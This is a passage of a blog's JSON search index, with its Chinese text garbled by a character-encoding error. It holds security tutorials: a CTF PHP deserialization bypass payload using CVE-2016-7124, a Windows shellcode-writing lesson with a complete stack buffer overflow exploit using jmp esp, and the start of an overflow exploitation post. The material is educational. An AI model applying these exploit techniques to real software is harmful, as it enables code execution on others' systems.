&#x27;&lt;br /&gt;&#x27;;echo base64_encode($b);echo &quot;&lt;hr&gt;&quot;;echo base64_decode(&quot;TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==&quot;);echo &quot;&lt;br /&gt;&quot;;echo urlencode(base64_decode(&quot;TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==&quot;));?&gt; æ€»ç»“ï¼š php ä¸­ 4 = +4 ï¼Œå¯ä»¥ç”¨æ¥ç»•è¿‡æ­£åˆ™åŒ¹é… ç»•è¿‡__wakeup()ï¼Œè¿™é‡Œå°±å¯ä»¥åˆ©ç”¨CVE-2016-7124çš„æ¼æ´ï¼šå³å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ ç§æœ‰å±æ€§(private)åˆ—åŒ–åï¼Œ ä¼šåœ¨å±æ€§åå‰åŠ ä¸Šç±»åï¼Œç±»åçš„å·¦å³ä¼šåŠ æœ‰%00","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://bobtaoy.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://bobtaoy.github.io/tags/CTF/"}]},{"title":"shellcodeç¼–å†™(ä¸‰)","slug":"shellcodeç¼–å†™-ä¸‰","date":"2020-10-06T00:31:03.000Z","updated":"2020-10-28T07:30:41.596Z","comments":true,"path":"2020/10/06/shellcodeç¼–å†™-ä¸‰/","link":"","permalink":"https://bobtaoy.github.io/2020/10/06/shellcode%E7%BC%96%E5%86%99-%E4%B8%89/","excerpt":"","text":"åˆ‡å…¥æ­£é¢˜ï¼Œè¿™æ¬¡æˆ‘ä»¬è¿›è¡Œshellcodeç¼–å†™ï¼Œåªæ˜¯åŸºç¡€çš„ç¼–å†™ï¼Œä¸ä¼šæ¶‰åŠçš„å¤ªå¤æ‚ï¼Œæˆ‘ä»¬è¿™æ¬¡ç¼–å†™çš„shellcodeå°±æ˜¯è®©ç¨‹åºè‡ªåŠ¨å¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„cè¯­è¨€ä¸­çš„`MessageBox()`è¿™ä¸ªå‡½æ•°æ¥è¿›è¡Œç¼–å†™ã€‚ æˆ‘ä»¬é¦–å…ˆéœ€è¦åšçš„å°±æ˜¯è·å–è°ƒç”¨MessageBox()è¿™ä¸ªå‡½æ•°çš„API.æ‰€ä»¥è¯´ï¼Œæˆ‘ä»¬å°±éœ€è¦è·å–è¯¥å‡½æ•°çš„åœ°å€ 12345678910111213141516#include &lt;windows.h&gt;#include &lt;stdio.h&gt;typedef void (*MYPROC)(LPTSTR);int main()&#123; HINSTANCE LibHandle; MYPROC ProcAdd; LibHandle = LoadLibrary(&quot;user32&quot;); //è·å–user32.dllçš„åœ°å€ printf(&quot;user32 = 0x%x\\n&quot;, LibHandle); //è·å–MessageBoxAçš„åœ°å€ ProcAdd=(MYPROC)GetProcAddress(LibHandle,&quot;MessageBoxA&quot;); printf(&quot;MessageBoxA = 0x%x\\n&quot;, ProcAdd); getchar(); return 0;&#125; æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š MessageBox()å‡½æ•°åœ¨æˆ‘ä»¬ç³»ç»Ÿä¸­çš„åœ°å€ä¸º0x77d507ea å½“ç„¶è¿™ä¸ªåœ°å€åœ¨ä¸åŒçš„ç³»ç»Ÿä¸­ï¼Œåº”è¯¥æ˜¯ä¸åŒçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ç¼–å†™ShellCodeä¹‹å‰ï¼Œä¸€å®šè¦å…ˆæŸ¥æ‰¾æ‰€è¦è°ƒç”¨çš„APIå‡½æ•°çš„åœ°å€ ï¼Œç”±äºæˆ‘ä»¬åˆ©ç”¨æº¢å‡ºæ“ä½œç ´åäº†åŸæœ¬çš„æ ˆç©ºé—´çš„å†…å®¹ï¼Œè¿™å°±å¯èƒ½ä¼šåœ¨æˆ‘ä»¬çš„å¯¹è¯æ¡†æ˜¾ç¤ºå®Œåï¼Œå¯¼è‡´ç¨‹åºå´©æºƒï¼Œæ‰€ä»¥ä¸ºäº†è°¨æ…èµ·è§ï¼Œæˆ‘ä»¬è¿™é‡Œè¿˜éœ€è¦ä½¿ç”¨ExitProcess()å‡½æ•°æ¥ä»¤ç¨‹åºç»ˆæ­¢ã€‚è¿™ä¸ªå‡½æ•°ä½äºkernel32.dllé‡Œé¢ï¼Œæ‰€ä»¥è¿™é‡ŒåŒæ ·å¯ä»¥ä½¿ç”¨ä¸Šè¿°ç¨‹åºè¿›è¡Œå‡½æ•°åœ°å€çš„æŸ¥æ‰¾ï¼Œåªè¦ç¨å¾®ä¿®æ”¹ä¸€ä¸‹å°±å¯ä»¥äº†ï¼š 12345678910111213141516#include &lt;windows.h&gt;#include &lt;stdio.h&gt;typedef void (*MYPROC)(LPTSTR);int main()&#123; HINSTANCE LibHandle; MYPROC ProcAdd; LibHandle = LoadLibrary(&quot;kernel32&quot;); // è¿™é‡Œ //è·å–user32.dllçš„åœ°å€ printf(&quot;kernel32 = 0x%x\\n&quot;, LibHandle); //è·å–MessageBoxAçš„åœ°å€ ProcAdd=(MYPROC)GetProcAddress(LibHandle,&quot;ExitProcess&quot;); // è¿™é‡Œ printf(&quot;ExitProcess = 0x%x\\n&quot;, ProcAdd); getchar(); return 0;&#125; è¿è¡Œç»“æœå¦‚ä¸‹: ExitProcess()åœ°å€æ˜¯0x7c81cafa æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°±å¼€å§‹ç¼–å†™æ±‡ç¼–ä»£ç ã€‚ åœ¨æ±‡ç¼–è¯­è¨€ä¸­ï¼Œæƒ³è°ƒç”¨æŸä¸ªå‡½æ•°ï¼Œæ˜¯éœ€è¦ä½¿ç”¨CALLè¯­å¥çš„ï¼Œè€Œåœ¨CALLè¯­å¥çš„åé¢ï¼Œéœ€è¦è·Ÿä¸Šè¯¥å‡½æ•°åœ¨ç³»ç»Ÿä¸­çš„åœ°å€ã€‚å› ä¸ºæˆ‘åˆšæ‰å·²ç»è·å–åˆ°äº†MessageBox()ä¸ExitProcess()å‡½æ•°çš„åœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è¿™é‡Œå°±å¯ä»¥é€šè¿‡CALLç›¸åº”çš„åœ°å€çš„æ–¹æ³•æ¥è°ƒç”¨ç›¸åº”çš„å‡½æ•°ã€‚ä½†æ˜¯å®é™…ä¸Šï¼Œæˆ‘ä»¬åœ¨ç¼–ç¨‹çš„æ—¶å€™ï¼Œä¸€èˆ¬è¿˜æ˜¯å…ˆå°†åœ°å€èµ‹ç»™è¯¸å¦‚eaxè¿™æ ·çš„å¯„å­˜å™¨ï¼Œç„¶åå†CALLç›¸åº”çš„å¯„å­˜å™¨ï¼Œä»è€Œå®ç°è°ƒç”¨çš„ ã€‚ å¦‚æœè¯´æˆ‘ä»¬æƒ³è¦è°ƒç”¨çš„å‡½æ•°è¿˜åŒ…å«æœ‰å‚æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦å…ˆå°†å‚æ•°åˆ©ç”¨PUSHè¯­å¥ä»å³è‡³å·¦åˆ†åˆ«å…¥æ ˆï¼Œä¹‹åå†è°ƒç”¨CALLè¯­å¥ã€‚æ¯”å¦‚ç°åœ¨æœ‰ä¸€ä¸ªFunction(a,b,c)å‡½æ•°ï¼Œæˆ‘ä»¬æƒ³è°ƒç”¨å®ƒï¼Œé‚£ä¹ˆå®ƒçš„æ±‡ç¼–ä»£ç å°±åº”è¯¥ç¼–å†™ä¸ºï¼š 12345push cpush bpush amov eax,Addrssfunctioncall eax æ ¹æ®è¿™ä¸ªæ€æƒ³ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨VC++ä¸­åˆ©ç”¨å†…è”æ±‡ç¼–æ¥è°ƒç”¨ ExitProcess()è¿™ä¸ªå‡½æ•°ï¼š 1234xor ebx,ebx # ebx &#x3D; 0push ebxmov eax, 0x7c81cafacall eax æ¥ä¸‹æ¥ç¼–å†™MessageBox()è¿™ä¸ªå‡½æ•°è°ƒç”¨ã€‚ä¸ä¸Šä¸€ä¸ªå‡½æ•°ä¸åŒçš„æ˜¯ï¼Œè¿™ä¸ªAPIå‡½æ•°åŒ…å«æœ‰å››ä¸ªå‚æ•°ï¼Œå½“ç„¶ç¬¬ä¸€å’Œç¬¬å››ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥èµ‹ç»™0å€¼ï¼Œä½†æ˜¯ä¸­é—´ä¸¤ä¸ªå‚æ•°éƒ½åŒ…å«æœ‰è¾ƒé•¿çš„å­—ç¬¦ä¸²ï¼Œè¿™æ—¶å€™å°±è¦æŠŠæ‰€éœ€è¦ç”¨åˆ°çš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºASCIIç å€¼ï¼š 12345678910111213# ç„¶åå°†æ¯å››ä¸ªå­—ç¬¦ä¸ºä¸€ç»„ï¼Œè¿›è¡Œåˆ†ç»„ï¼Œå°†ä¸æ»¡å››ä¸ªå­—ç¬¦çš„ï¼Œä»¥ç©ºæ ¼ï¼ˆx20ï¼‰è¿›è¡Œå¡«å……warning:\\x57\\x61\\x72\\x6e\\x69\\x6e\\x67\\x20You have been hacked!(by Taoy):\\x59\\x6f\\x75\\x20\\x68\\x61\\x76\\x65\\x20\\x62\\x65\\x65\\x6e\\x20\\x68\\x61\\x63\\x6b\\x65\\x64\\x21\\x28\\x62\\x79\\x20\\x54\\x61\\x6f\\x79\\x29\\x20\\x20 â€‹ è¿™é‡Œä¹‹æ‰€ä»¥éœ€è¦ä»¥x20è¿›è¡Œå¡«å……ï¼Œè€Œä¸æ˜¯x00è¿›è¡Œå¡«å……ï¼Œå°±æ˜¯å› ä¸ºæˆ‘ä»¬ç°åœ¨æ‰€åˆ©ç”¨çš„æ˜¯strcpyçš„æ¼æ´ï¼Œè€Œè¿™ä¸ªå‡½æ•°åªè¦ä¸€é‡åˆ°x00å°±ä¼šè®¤ä¸ºæˆ‘ä»¬çš„å­—ç¬¦ä¸²ç»“æŸäº†ï¼Œå°±ä¸ä¼šå†æ‹·è´x00åçš„å†…å®¹äº† ç”±äºæˆ‘ä»¬çš„è®¡ç®—æœºæ˜¯å°ç«¯æ˜¾ç¤ºï¼Œå› æ­¤å­—ç¬¦çš„è¿›å±•é¡ºåºæ˜¯ä»åå¾€å‰ä¸æ–­è¿›æ ˆçš„ï¼Œå³Warningçš„è¿›æ ˆé¡ºåºä¸ºï¼š 12push 0x20676e69push 0x6e726157 &#x2F;&#x2F; push &quot;Warning&quot; æˆ‘ä»¬å¦‚ä½•è·å–è¿™ä¸¤ä¸ªå­—ç¬¦ä¸²çš„åœ°å€ ? æˆ‘ä»¬å¯ä»¥åˆ©ç”¨espæŒ‡é’ˆï¼Œå› ä¸ºespå§‹ç»ˆæŒ‡å‘æ ˆé¡¶çš„ä½ç½®ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†å­—ç¬¦å‹å…¥æ ˆä»¥åï¼Œå°†espçš„å€¼èµ‹ç»™åˆ«çš„ç›¸åº”çš„å¯„å­˜å™¨å³å¯mov eax,esp æˆ– mov ebx,esp å¦‚æ­¤ï¼Œæˆ‘ä»¬åœ¨è¿›è¡Œå‡½æ•°çš„è°ƒç”¨ 123456push ebxpush eaxpush ecxpush ebxmov eax, 0x77d507eacall eax &#x2F;&#x2F; call MessageBox æˆ‘ä»¬å°†ä»£ç å†™å…¥vc6.0++, å®Œæ•´ä»£ç å¦‚ä¸‹: 12345678910111213141516171819202122232425262728293031int main()&#123; _asm&#123; sub esp,0x50 xor ebx,ebx push ebx // cut string push 0x20676e69 push 0x6e726157 // push &quot;Warning&quot; mov eax,esp push ebx // cut string push 0x20202979 push 0x6f615420 push 0x79622821 push 0x64656b63 push 0x6168206e push 0x65656220 push 0x65766168 push 0x20756f59 // push &quot;You have been hacked!(by Taoy)&quot; mov ecx,esp push ebx push eax push ecx push ebx mov eax,0x77d507ea call eax // call MessageBox push ebx mov eax, 0x7c81cafa call eax // call ExitProcess &#125;return 0;&#125; ç„¶åæˆ‘ä»¬é€šè¿‡è°ƒè¯•æ¥æå–shellcode. æŒ‰ä¸‹F9å·¦ä¾§æœ‰ä¸ªçº¢è‰²çš„åœ†åœˆå‡ºç°åï¼Œç„¶åæŒ‰F5è¿›å…¥è°ƒè¯•ï¼Œç„¶åalt + 8,æ˜¾ç¤ºæœºå™¨ç  å°†è¿™ä¸ªæ±‡ç¼–æŒ‡ä»¤è½¬æ¢çš„æœºå™¨ç æå–å‡ºæ¥å³å¯,æå–å®Œæœºå™¨ç , å®Œæ•´çš„shellcodeä»¥åŠç¨‹åºä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829char name[] &#x3D;&quot;\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41&quot; &#x2F;&#x2F;name[0]~name[7]&quot;\\x42\\x42\\x42\\x42&quot; &#x2F;&#x2F;EBP&quot;\\x79\\x5b\\xe3\\x77&quot; &#x2F;&#x2F;ReturnAddress&quot;\\x83\\xEC\\x50&quot; &#x2F;&#x2F;subesp,0x50&quot;\\x33\\xDB&quot; &#x2F;&#x2F;xorebx,ebx&quot;\\x53&quot; &#x2F;&#x2F;pushebx&quot;\\x68\\x69\\x6E\\x67\\x20&quot;&quot;\\x68\\x57\\x61\\x72\\x6E&quot; &#x2F;&#x2F;push&quot;Warning&quot;&quot;\\x8B\\xC4&quot; &#x2F;&#x2F;moveax,esp&quot;\\x53&quot; &#x2F;&#x2F;pushebx&quot;\\x68\\x79\\x29\\x20\\x20&quot;&quot;\\x68\\x20\\x54\\x61\\x6f&quot;&quot;\\x68\\x21\\x28\\x62\\x79&quot;&quot;\\x68\\x63\\x6B\\x65\\x64&quot;&quot;\\x68\\x6E\\x20\\x68\\x61&quot;&quot;\\x68\\x20\\x62\\x65\\x65&quot;&quot;\\x68\\x68\\x61\\x76\\x65&quot;&quot;\\x68\\x59\\x6F\\x75\\x20&quot; &#x2F;&#x2F;push&quot;Youhavebeenhacked!(byJ.Y.)&quot;&quot;\\x8B\\xCC&quot; &#x2F;&#x2F;movecx,esp&quot;\\x53&quot; &#x2F;&#x2F;pushebx&quot;\\x50&quot; &#x2F;&#x2F;pusheax&quot;\\x51&quot; &#x2F;&#x2F;pushecx&quot;\\x53&quot; &#x2F;&#x2F;pushebx&quot;\\xB8\\xea\\x07\\xd5\\x77&quot;&quot;\\xFF\\xD0&quot; &#x2F;&#x2F;callMessageBox&quot;\\x53&quot;&quot;\\xB8\\xFA\\xCA\\x81\\x7C&quot;&quot;\\xFF\\xD0&quot;; ç”±äºæˆ‘ä»¬è¿™é‡Œè°ƒç”¨äº†MessageBoxï¼Œå› æ­¤éœ€è¦åœ¨æºç¨‹åºä¸­åŠ å…¥LoadLibrary(â€œuser32.dllâ€);è¿™æ¡è¯­å¥ç”¨äºåŠ è½½ç›¸åº”çš„åŠ¨æ€é“¾æ¥åº“ï¼Œè€Œç”±äºä½¿ç”¨äº†LoadLibrary()ï¼Œè¿˜éœ€è¦åŠ å…¥windows.hè¿™ä¸ªå¤´æ–‡ä»¶ã€‚ æ­¤æ—¶ä»£ç ä¸ºï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;char name[] =&quot;\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41&quot; //name[0]~name[7]&quot;\\x42\\x42\\x42\\x42&quot; //EBP&quot;\\x79\\x5b\\xe3\\x77&quot; //ReturnAddress&quot;\\x83\\xEC\\x50&quot; //subesp,0x50&quot;\\x33\\xDB&quot; //xorebx,ebx&quot;\\x53&quot; //pushebx&quot;\\x68\\x69\\x6E\\x67\\x20&quot;&quot;\\x68\\x57\\x61\\x72\\x6E&quot; //push&quot;Warning&quot;&quot;\\x8B\\xC4&quot; //moveax,esp&quot;\\x53&quot; //pushebx&quot;\\x68\\x79\\x29\\x20\\x20&quot;&quot;\\x68\\x20\\x54\\x61\\x6f&quot;&quot;\\x68\\x21\\x28\\x62\\x79&quot;&quot;\\x68\\x63\\x6B\\x65\\x64&quot;&quot;\\x68\\x6E\\x20\\x68\\x61&quot;&quot;\\x68\\x20\\x62\\x65\\x65&quot;&quot;\\x68\\x68\\x61\\x76\\x65&quot;&quot;\\x68\\x59\\x6F\\x75\\x20&quot; //push&quot;Youhavebeenhacked!(by Taoy)&quot;&quot;\\x8B\\xCC&quot; //movecx,esp&quot;\\x53&quot; //pushebx&quot;\\x50&quot; //pusheax&quot;\\x51&quot; //pushecx&quot;\\x53&quot; //pushebx&quot;\\xB8\\xea\\x07\\xd5\\x77&quot;&quot;\\xFF\\xD0&quot; //callMessageBox&quot;\\x53&quot;&quot;\\xB8\\xFA\\xCA\\x81\\x7C&quot;&quot;\\xFF\\xD0&quot;;int main()&#123; char buffer[8]; LoadLibrary(&quot;user32.dll&quot;); // åŠ è½½ user32.dll åŠ¨æ€é“¾æ¥åº“ strcpy(buffer, name); printf(&quot;%s\\n&quot;,buffer); getchar(); return 0;&#125; ç„¶åè¿è¡Œç¨‹åºï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æˆåŠŸåˆ©ç”¨äº†æ¼æ´ï¼š æˆ‘ä»¬æ¥ä¸‹æ¥ä½¿ç”¨ODè°ƒè¯•ï¼Œä¸€æ­¥ä¸€æ­¥è·Ÿè¿›ï¼Œå‘ç°æŒ‡å‘å®Œjmp espï¼Œè·³è½¬åˆ°äº†æˆ‘ä»¬çš„shellcodeå¤„ æˆ‘ä»¬ç»§ç»­å¾€ä¸‹,ä¸‹å›¾æ˜¾ç¤ºçš„è¿‡ç¨‹å°±æ˜¯æŠŠMessageBox()å‡½æ•°çš„å‚æ•°å…¥æ ˆï¼Œç„¶åcall è¿™ä¸ªå‡½æ•° æœ€åï¼Œæˆ‘ä»¬è§‚å¯Ÿä¸€ä¸‹æ•°æ®ä»¥åŠå †æ ˆçš„æƒ…å†µï¼š æˆ‘ä»¬è·³è½¬åˆ°espå¤„ï¼ˆåœ¨æ•°æ®åŒºåŸŸ, ctrl+G, è¾“å…¥ espï¼‰ï¼ŒæŸ¥çœ‹æ ˆåŒºåŸŸçš„æ•°æ®: å‚è€ƒï¼š https://blog.csdn.net/ioio_jy/article/details/48316111","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://bobtaoy.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"æº¢å‡ºæ”»å‡»","slug":"æº¢å‡ºæ”»å‡»","permalink":"https://bobtaoy.github.io/tags/%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"}]},{"title":"ç¼“å†²åŒºæº¢å‡ºçš„åˆ©ç”¨(äºŒ)","slug":"ç¼“å†²åŒºæº¢å‡ºçš„åˆ©ç”¨-äºŒ","date":"2020-10-06T00:28:44.000Z","updated":"2020-10-28T07:21:15.175Z","comments":true,"path":"2020/10/06/ç¼“å†²åŒºæº¢å‡ºçš„åˆ©ç”¨-äºŒ/","link":"","permalink":"https://bobtaoy.github.io/2020/10/06/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E7%9A%84%E5%88%A9%E7%94%A8-%E4%BA%8C/","excerpt":"","text":"ç¼“å†²åŒºæº¢å‡ºåˆ©ç”¨ æˆ‘ä»¬è¿™æ¬¡çš„ç¯å¢ƒè·Ÿä¸Šä¸€ç¯‡ä¸€æ ·ï¼Œä¸Šä¸€ç¯‡åªæ˜¯åˆ†æäº†å‘ç”Ÿçš„åŸå› ï¼Œè¿™ä¸€ç¯‡æˆ‘ä»¬å°±å¯¹äº§ç”Ÿç¼“å†²åŒºæº¢å‡ºè¿›è¡Œåˆ©ç”¨ï¼Œè¿˜æ˜¯ä¹‹å‰é‚£ä¸¤ä¸ªç¨‹åº`test1.exe` and `test2.exe`çš„åŸºç¡€ä¸Šè¿›è¡Œè®²è§£ï¼Œæ‰€ä»¥ä¸Šä¸€ç¯‡ä¸€å®šè¦ç†è§£ï¼ï¼ï¼ ç¼“å†²åŒºæº¢å‡ºç¨‹åºï¼Œtest2.exeä»£ç å¦‚ä¸‹ï¼š 12345678910111213#include&lt;stdio.h&gt; #include&lt;string.h&gt; //å¼•å…¥å¤´æ–‡ä»¶char name[] = &quot;betaobetaobetao&quot;; //å®šä¹‰å…¨å±€å˜é‡,ï¼ï¼ï¼ æ³¨æ„ï¼Œè¿™é‡Œå¤šäº†ä¸¤ä¸ªbetaoint main() //è¿”å›å€¼ ä¸»å‡½æ•°main()&#123; char buffer[8]; //å¼€è¾Ÿ8ä¸ªå­—èŠ‚çš„ç©ºé—´ç”¨æ¥å­˜å‚¨å˜é‡name strcpy(buffer,name); //å†…ç½®å‡½æ•°ï¼ˆä½œç”¨ï¼‰ï¼šå°†å˜é‡nameå†…å®¹èµ‹å€¼ç»™bufferå˜é‡ printf(&quot;%s\\n&quot;,buffer); //è¾“å‡º getchar(); //æ–¹ä¾¿è§‚å¯Ÿ ä½œç”¨ï¼šç­‰å¾…ç”¨æˆ·è¾“å…¥æŒ‰é”® return 0; //è¿”å›å€¼&#125; è¿™é‡Œæˆ‘ä»¬éœ€è¦åˆ†æˆå‡ ä¸ªæ­¥éª¤ï¼š 1.ç²¾ç¡®å®šä½è¿”å›åœ°å€çš„ä½ç½® 2.å¯»æ‰¾è¦†ç›–åŸå§‹è¿”å›åœ°å€çš„åœ°å€ 3.ç¼–å†™shellcodeåˆ°ç›¸åº”çš„ç¼“å†²åŒº(è¿™ä¸€æ­¥ä¼šæ¶‰åŠå¾ˆå¤šä¸œè¥¿ï¼Œæ±‡ç¼–è¯­è¨€ç­‰ï¼Œæ‰€ä»¥ä¸‹ä¸€ç¯‡è¯´) ç»è¿‡ä¸Šä¸€ç¯‡ï¼Œè¡¥å……å†…å®¹ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡ç¨‹åºæŠ¥é”™çš„æ˜¾ç¤ºï¼Œå¾ˆå¿«çš„æ‰¾åˆ°äº†Address,æŠ¥é”™åœ°å€æ˜¯0x006f6174,æˆ‘ä»¬é€šè¿‡æŠŠåå…­è¿›åˆ¶è½¬æ¢æˆASCIIç ï¼š è¿™é‡Œçš„`tao`æ­£å¥½æ˜¯æˆ‘ä»¬è¾“å…¥é‚£ä¸€ä¸²é•¿å­—ç¬¦çš„æœ€åä¸‰ä¸ªå­—æ¯ï¼Œç”±äºåœ°å€æ˜¯4ä¸ªå­—èŠ‚è¡¨ç¤ºï¼Œå¦‚æœæˆ‘å°†å…¨å±€å˜é‡`name`èµ‹å€¼ä¸º`betaobetaobeXXXX`é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´ï¼Œå››ä¸ª`X`å°±æ˜¯æˆ‘ä»¬è¦†ç›–çš„è¿”å›åœ°å€ï¼Œæˆ‘ä»¬ä¸Šæ¬¡ä¹Ÿè¯´äº†ï¼Œ`buffer`å˜é‡åªæœ‰8ä¸ªå­—èŠ‚çš„ç©ºé—´ï¼Œåé¢å››ä¸ªå­—èŠ‚`aobe`æ˜¯çˆ¶å‡½æ•°EBPçš„åœ°å€ï¼Œåˆ°è¿™é‡Œï¼Œæˆ‘ä»¬ä¹Ÿå°±è§£å†³äº†ç¬¬ä¸€ä¸ªé—®é¢˜----&gt; **ç²¾ç¡®å®šä½è¿”å›åœ°å€çš„ä½ç½®**ã€‚ â€‹ è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜éœ€è¦è¯´æ˜ä¸€ä¸‹ï¼Œå› ä¸ºæˆ‘ä»¬è¿™ä¸ªç¨‹åºçš„å±€éƒ¨å˜é‡bufferåªæœ‰8ä¸ªå­—èŠ‚ï¼Œå› æ­¤å¾ˆå®¹æ˜“å°±èƒ½å¤Ÿè¢«å¡«å……æ»¡ï¼Œä»è€Œå¾ˆå®¹æ˜“å°±èƒ½å¤Ÿè¢«å®šä½ï¼Œä½†æ˜¯å¦‚æœç¼“å†²åŒºç©ºé—´å¾ˆå¤§ï¼Œè¯¥å¦‚ä½•å®šä½å‘¢ï¼Ÿæ€»ä¸èƒ½è¿˜æ˜¯é‡å¤betaobetaobetao...å§ï¼Œæˆ‘ä»¬è¿™é‡Œä½¿ç”¨26ä¸ªå¤§å†™å­—ç¬¦ä¸å°å†™å­—ç¬¦ï¼Œä¸€å…±52ä¸ªå­—ç¬¦è¿›è¡Œæµ‹è¯•ï¼Œä¸€æ¬¡å°±å¯ä»¥éªŒè¯52ä¸ªå­—èŠ‚çš„ç¼“å†²åŒºç©ºé—´ã€‚ â€‹ æˆ‘ä»¬è¿™é‡Œä¿®æ”¹å±€éƒ¨å˜é‡æ•°ç»„å¤§å°ä¸º80,æˆ‘ä»¬åŠ ä¸¤ç«¯è‹±æ–‡å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯104ä¸ªå­—ç¬¦ã€‚ 12345678910111213#include&lt;stdio.h&gt; #include&lt;string.h&gt; //å¼•å…¥å¤´æ–‡ä»¶char name[] = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;; //å®šä¹‰å…¨å±€å˜é‡,ï¼ï¼ï¼int main() //è¿”å›å€¼ ä¸»å‡½æ•°main()&#123; char buffer[80]; //å¼€è¾Ÿ80ä¸ªå­—èŠ‚çš„ç©ºé—´ç”¨æ¥å­˜å‚¨å˜é‡name ï¼ï¼ï¼ strcpy(buffer,name); //å†…ç½®å‡½æ•°ï¼ˆä½œç”¨ï¼‰ï¼šå°†å˜é‡nameå†…å®¹èµ‹å€¼ç»™bufferå˜é‡ printf(&quot;%s\\n&quot;,buffer); //è¾“å‡º getchar(); //æ–¹ä¾¿è§‚å¯Ÿ ä½œç”¨ï¼šç­‰å¾…ç”¨æˆ·è¾“å…¥æŒ‰é”® return 0; //è¿”å›å€¼&#125; å°†ä»¥ä¸ŠCä»£ç ç¨‹åºç¼–è¯‘â€¦,ç„¶åè¿è¡Œ â€‹ åœ¨Addressåå¯ä»¥å‘ç°ï¼Œå…¶å€¼ä¸º0x6a696867ï¼Œæ³¨æ„æˆ‘ä»¬çš„ç³»ç»Ÿæ˜¯å°ç«¯æ˜¾ç¤ºï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®é™…çš„å­—ç¬¦åº”è¯¥æ˜¯0x67ã€0x68ã€0x69ã€0x6aã€‚é‚£ä¹ˆæŠŠå®ƒè½¬æ¢æˆå­—æ¯ï¼Œå¯ä»¥çŸ¥é“æ˜¯gã€hã€iã€j é€šè¿‡pythonè½¬æ¢æˆASCIIç ï¼š æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹ï¼Œä¸ºä»€ä¹ˆæ˜¯ghij,çœ‹ä¸‹å›¾ ok,æˆ‘ä»¬å›åˆ°æˆ‘ä»¬ç®€å•çš„ç¨‹åº â€‹ ç»è¿‡ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬è¿˜éœ€è¦ç¡®å®šbetaobetaobeXXXXä¸­çš„æœ€åå››ä¸ªâ€œXâ€åº”è¯¥æ˜¯ä»€ä¹ˆåœ°å€ã€‚è¿™é‡Œæˆ‘ä»¬ä¸èƒ½å‡­ç©ºåˆ›é€ ä¸€ä¸ªåœ°å€ï¼Œè€Œæ˜¯åº”è¯¥åŸºäºä¸€ä¸ªåˆæ³•åœ°å€çš„åŸºç¡€ä¹‹ä¸Šã€‚å½“ç„¶æˆ‘ä»¬é€šè¿‡åœ¨ODä¸­çš„è§‚å¯Ÿï¼Œç¡®å®èƒ½å¤Ÿæ‰¾åˆ°å¾ˆå¤šåˆé€‚çš„åœ°å€ï¼Œä½†æ˜¯è¿™ç§æ–¹æ³•ä¸å…·æœ‰é€šç”¨æ€§ï¼Œæ¯•ç«Ÿè¦æ‰¾ä¸€ä¸ªç¡®åˆ‡çš„åœ°å€è¿˜æ˜¯ä¸é‚£ä¹ˆæ–¹ä¾¿çš„ã€‚è§£å†³è¿™ä¸ªé—®é¢˜çš„æ–¹æ³•æœ‰å¾ˆå¤šç§ï¼Œä½†æ˜¯æœ€ä¸ºå¸¸ç”¨æœ€ä¸ºç»å…¸çš„ï¼Œå°±æ˜¯jmp espæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯åˆ©ç”¨è·³æ¿è¿›è¡Œè·³è½¬ã€‚ â€‹ è¿™é‡Œçš„è·³æ¿æ˜¯ç¨‹åºä¸­åŸæœ‰çš„æœºå™¨ä»£ç ï¼Œå®ƒä»¬éƒ½æ˜¯èƒ½å¤Ÿè·³è½¬åˆ°ä¸€ä¸ªå¯„å­˜å™¨å†…æ‰€å­˜æ”¾çš„åœ°å€è¿›è¡Œæ‰§è¡Œï¼Œå¦‚jmp espã€call espã€jmp ecxã€call eaxç­‰ç­‰ã€‚å¦‚æœåœ¨å‡½æ•°è¿”å›çš„æ—¶å€™ï¼ŒCPUå†…å¯„å­˜å™¨åˆšå¥½ç›´æ¥æˆ–è€…é—´æ¥æŒ‡å‘ShellCodeçš„å¼€å¤´ï¼Œè¿™æ 